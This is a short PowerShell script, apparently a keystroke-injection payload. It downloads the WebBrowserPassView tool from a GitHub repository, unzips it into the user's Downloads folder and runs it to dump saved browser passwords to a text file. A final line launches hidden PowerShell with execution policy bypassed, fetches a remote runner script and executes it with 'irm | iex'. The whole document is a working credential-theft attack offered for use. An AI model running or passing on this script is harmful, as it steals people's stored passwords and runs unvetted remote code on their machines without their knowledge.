$nameFile="WebBrowserPassView"
$runDirectory="$env:USERPROFILE\downloads"

$zipFolder="$runDirectory\$nameFile.zip"
$unzipFolder="$runDirectory\$nameFile"
$exeFile="$unzipFolder\$nameFile.exe"
$txtFile="$unzipFolder\$nameFile.txt"

$params="/sfile $txtFile"


Set-Location -path $runDirectory
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/MaxAxoft/demo/main/WebBrowserPassView.zip" `
-WebSession $session -OutFile $zipFolder `
-Headers @{
"authority"="raw.githubusercontent.com"
  "method"="GET"
  "path"="/MaxAxoft/demo/main/WebBrowserPassView.zip"
  "scheme"="https"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  "accept-encoding"="gzip, deflate, br, zstd"
  "accept-language"="en,nl;q=0.9,en-GB;q=0.8,en-US;q=0.7"
  "referer"="https://github.com/MaxAxoft/demo/blob/main/WebBrowserPassView.zip"
  "sec-ch-ua"="`"Microsoft Edge`";v=`"123`", `"Not:A-Brand`";v=`"8`", `"Chromium`";v=`"123`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="cross-site"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}
Expand-Archive $zipFolder -DestinationPath $unzipFolder
& "$exeFile" $params
$txtFile

#STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex

